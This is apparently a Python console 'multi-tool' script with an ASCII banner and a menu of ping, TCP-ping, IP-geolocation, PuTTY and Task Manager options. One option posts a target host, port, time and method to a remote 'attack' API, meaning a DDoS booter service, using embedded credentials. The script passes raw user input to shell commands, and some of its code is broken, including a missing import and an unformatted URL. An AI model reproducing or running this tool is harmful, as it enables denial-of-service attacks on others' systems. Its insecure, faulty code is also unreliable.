# Import gradient
# For Color
try:
    import fade
except:
    os.system('pip install fade')
    import fade

# Import Ctypes
# For Title
try:
    import ctypes
except:
    os.system('pip install ctypes')
    import ctypes

try:
    import colorama
except:
    os.system('pip install colorama')
    import colorama

try:
    import requests
except:
    os.system("pip install requests")
    import requests

# Imports
import webbrowser
#import pystyle
import requests
import platform
import time
import sys
import os

from colorama import Fore, Back, Style
from random import randint
from os import system

# Title 
ctypes.windll.kernel32.SetConsoleTitleW(f"Logged in: {os.getlogin()} | Expires: NEVER")

sys_os = platform.system()
def clear():
        os.system("cls") if sys_os == "Windows" else os.system('clear')

while True:
    clear()
    main = f"""
    █████████                       █████     ███                      ████      █████████   █████████  █████   █████
   ███░░░░░███                     ░░███     ░░░                      ░░███     ███░░░░░███ ███░░░░░███░░███   ░░███ 
  ░███    ░░░   ██████  ████████   ███████   ████  ████████    ██████  ░███    ░███    ░░░ ░███    ░░░  ░███    ░███ 
  ░░█████████  ███░░███░░███░░███ ░░░███░   ░░███ ░░███░░███  ███░░███ ░███    ░░█████████ ░░█████████  ░███████████ 
   ░░░░░░░░███░███████  ░███ ░███   ░███     ░███  ░███ ░███ ░███████  ░███     ░░░░░░░░███ ░░░░░░░░███ ░███░░░░░███ 
   ███    ░███░███░░░   ░███ ░███   ░███ ███ ░███  ░███ ░███ ░███░░░   ░███     ███    ░███ ███    ░███ ░███    ░███ 
  ░░█████████ ░░██████  ████ █████  ░░█████  █████ ████ █████░░██████  █████   ░░█████████ ░░█████████  █████   █████
   ░░░░░░░░░   ░░░░░░  ░░░░ ░░░░░    ░░░░░  ░░░░░ ░░░░ ░░░░░  ░░░░░░  ░░░░░     ░░░░░░░░░   ░░░░░░░░░  ░░░░░   ░░░░░ 
{Fore.RED}Discalimer: Developers assume no liability and are not responsible for any misuse or damage caused by VIPERv2 Multi-Tool"""
    modules = f"""
                                               ╚═╦═══════════════════╦═╝
                                          ╚══╦═══╬═══════════════════╩═══╦══╝
                                             ║ 1 ║ IP Pinger             ║
                                             ║ 2 ║ TCP Pinger            ║
                                             ║ 3 ║ IP Look up            ║
                                             ║ 4 ║ Look up Your IP       ║ 
                                             ║ 5 ║ Putty                 ║ 
                                             ║ 6 ║ Rocket API            ║ 
                                             ║ 7 ║ Check host            ║ 
                                             ║ 8 ║ Task Manager          ║ 
                                             ║ 9 ║ Clear                 ║ 
                                            ╚╩═══╩═══════════════════════╩╝
                                        Made for Sentinel ♥ Coded BanRioT/Deadly"""


    faded_text = fade.fire(main)
    print(faded_text)
    faded_text = fade.fire(modules)
    print(faded_text)
    
    choice = input(f"{Fore.LIGHTBLACK_EX}┏━({Fore.LIGHTGREEN_EX}root-{os.getlogin()}{Fore.LIGHTBLACK_EX})\n┗━━╸#{Fore.CYAN}{Fore.RESET} ")

    while type(choice) != int:
        try:
            choice = int(choice)
            break
        except:
            choice = input(f"{Fore.LIGHTBLACK_EX}┏━({Fore.LIGHTGREEN_EX}root-{os.getlogin()}{Fore.LIGHTBLACK_EX})\n┗━━╸#{Fore.CYAN}{Fore.RESET} ")

    if int(choice) < 1 or int(choice) > 9:
            choice = input(f"{Fore.LIGHTBLACK_EX}┏━({Fore.LIGHTGREEN_EX}root-{os.getlogin()}{Fore.LIGHTBLACK_EX})\n┗━━╸#{Fore.CYAN}{Fore.RESET} ")
    
    elif choice == 1:
        ip_ = input("Enter the IP address: ")
        os.system(f"ping {ip_}")
        input("Enter to continue")
        
    
    elif choice == 2:
        ip_ = input("Enter the IP address: ")
        port_ = input("Enter the Port: ")
        # times_ = input("How many times do you want to ping this IP: ")
        os.system(f"paping {ip_} -p {port_}")
        input("Enter to continue")

    elif choice == 3:
        def get_info(ip_):
            info = []
            response = requests.get(f'http://demo.ip-api.com/json/{ip_}?fields=66842623&lang=en')
            if response.status_code == 200:
                response = response.json()
                info.append(response['status']) # 0, -23
                info.append(response['continent']) # 1, -22
                info.append(response['continentCode']) # 2, -21
                info.append(response['country']) # 3, -20
                info.append(response['countryCode']) # 4, -19
                info.append(response['region']) # 5, -18
                info.append(response['regionName']) # 6, -17
                info.append(response['city']) # 7, -16
                info.append(response['district']) # 8, -15
                info.append(response['zip']) # 9, -14
                info.append(response['lat']) # 10, -13
                info.append(response['lon']) # 11, -12
                info.append(response['timezone']) # 12, -11
                info.append(response['offset']) # 13, -10
                info.append( response['currency']) # 14, -9
                info.append(response['isp']) # 15, -8
                info.append(response['org']) # 16, -7
                info.append(response['as']) # 17, -6
                info.append(response['asname']) # 18, -5
                info.append(response['mobile']) # 19, -4
                info.append(response['proxy']) # 20, -3
                info.append(response['hosting']) # 21, -2
                info.append(response['query']) # 22, -1
                
                return info
            else:
                return []

        ip_ = input("Enter the IP: ")
        ip_info = get_info(ip_)
        ip = f"{Fore.LIGHTBLACK_EX}IP: {ip_info[-1]}"
        lon = f"{Fore.LIGHTBLACK_EX}Lon: {ip_info[-12]}"
        lat = f"{Fore.LIGHTBLACK_EX}Lat: {ip_info[-13]}"
        zip = f"{Fore.LIGHTBLACK_EX}Zip: {ip_info[-14]}"
        region = f"{Fore.LIGHTBLACK_EX}Region: {ip_info[-18]}"
        city = f"{Fore.LIGHTBLACK_EX}City: {ip_info[-16]}"
        proxy = f"{Fore.LIGHTBLACK_EX}Proxy: {ip_info[-2]}"
        timezone = f"{Fore.LIGHTBLACK_EX}Timezone: {ip_info[-11]}"
        org = f"{Fore.LIGHTBLACK_EX}Org: {ip_info[-6]}"
        isp = f"{Fore.LIGHTBLACK_EX}Isp: {ip_info[-7]} {Fore.RESET}"
        print(f'{ip}\n{lon}\n{lat}\n{zip}\n{region}\n{city}\n{proxy}\n{timezone}\n{org}\n{isp}')
        input("Enter to continue")

    elif choice == 4:
        def get_self_info():
            info = []
            response = requests.get(f'http://demo.ip-api.com/json/?fields=66842623&lang=en')
            if response.status_code == 200:
                response = response.json()
                info.append(response['status']) # 0, -23
                info.append(response['continent']) # 1, -22
                info.append(response['continentCode']) # 2, -21
                info.append(response['country']) # 3, -20
                info.append(response['countryCode']) # 4, -19
                info.append(response['region']) # 5, -18
                info.append(response['regionName']) # 6, -17
                info.append(response['city']) # 7, -16
                info.append(response['district']) # 8, -15
                info.append(response['zip']) # 9, -14
                info.append(response['lat']) # 10, -13
                info.append(response['lon']) # 11, -12
                info.append(response['timezone']) # 12, -11
                info.append(response['offset']) # 13, -10
                info.append( response['currency']) # 14, -9
                info.append(response['isp']) # 15, -8
                info.append(response['org']) # 16, -7
                info.append(response['as']) # 17, -6
                info.append(response['asname']) # 18, -5
                info.append(response['mobile']) # 19, -4
                info.append(response['proxy']) # 20, -3
                info.append(response['hosting']) # 21, -2
                info.append(response['query']) # 22, -1
                
                return info
            else:
                return []

        ip_info = get_self_info()
        ip = f"{Fore.LIGHTBLACK_EX}IP: {ip_info[-1]}"
        lon = f"{Fore.LIGHTBLACK_EX}Lon: {ip_info[-12]}"
        lat = f"{Fore.LIGHTBLACK_EX}Lat: {ip_info[-13]}"
        zip = f"{Fore.LIGHTBLACK_EX}Zip: {ip_info[-14]}"
        region = f"{Fore.LIGHTBLACK_EX}Region: {ip_info[-18]}"
        city = f"{Fore.LIGHTBLACK_EX}City: {ip_info[-16]}"
        proxy = f"{Fore.LIGHTBLACK_EX}Proxy: {ip_info[-2]}"
        timezone = f"{Fore.LIGHTBLACK_EX}Timezone: {ip_info[-11]}"
        org = f"{Fore.LIGHTBLACK_EX}Org: {ip_info[-6]}"
        isp = f"{Fore.LIGHTBLACK_EX}Isp: {ip_info[-7]} {Fore.RESET}"
        print(f'{ip}\n{lon}\n{lat}\n{zip}\n{region}\n{city}\n{proxy}\n{timezone}\n{org}\n{isp}')
        input("Enter to continue")

    elif choice == 5:
        os.startfile(r"C:\Program Files\PuTTY\putty.exe")

    elif choice == 6:
        ip_ = input("Enter the IP address: ")
        port_ = input("Enter the Port: ")
        time_ = input("Enter the Time: ")
        methods_ = input("Enter the Methods: ")
        r = requests.post('http://api.rocketapi.cf/api/attack?username=YouTube&secret=ROCKET-YTPROMO691&host={ip_}&port={port_}&time={time_}&method={methods_}')
        website_content = r.content
        
    elif choice == 7:
        webbrowser.open("https://check-host.net/")

    elif choice == 8:
        os.startfile(r"C:\WINDOWS\system32\Taskmgr.exe")

    elif choice == 9:
        clear()